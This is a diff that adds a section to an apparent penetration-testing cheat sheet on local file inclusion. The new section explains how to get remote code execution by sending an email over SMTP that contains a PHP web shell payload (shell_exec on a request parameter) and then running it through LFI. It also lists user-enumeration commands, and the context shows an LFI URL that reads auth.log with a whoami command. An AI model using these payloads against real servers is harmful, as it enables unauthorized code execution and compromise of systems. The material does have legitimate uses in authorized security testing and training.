@@ -40,6 +40,27 @@ Inject payload
 
     http://domain.local/lfi.php?file=/var/log/auth.log?cmd=whoami
 
+## RCE via Email
+
+Using LFI, after enumerating users (e.g., /etc/passwd), you can attempt to execute PHP code through a mail server by embedding PHP in email data.
+
+#### 1. Connect to the mail server
+
+    telnet IP 25
+
+#### 2. Inject PHP payload into the email service
+
+    HELO localhost
+    MAIL FROM:<root>
+    RCPT TO:<www-data>
+    DATA
+    <?php echo shell_exec($_REQUEST['cmd']); ?>
+    .
+
+#### 3. Perform user enumeration if unsure about the users
+
+    smtp-user-enum -M VRFY -U <username_list> -t <target_ip>
+
 ## Path Traversal manual payloads
 
 Simple traversal: start with 
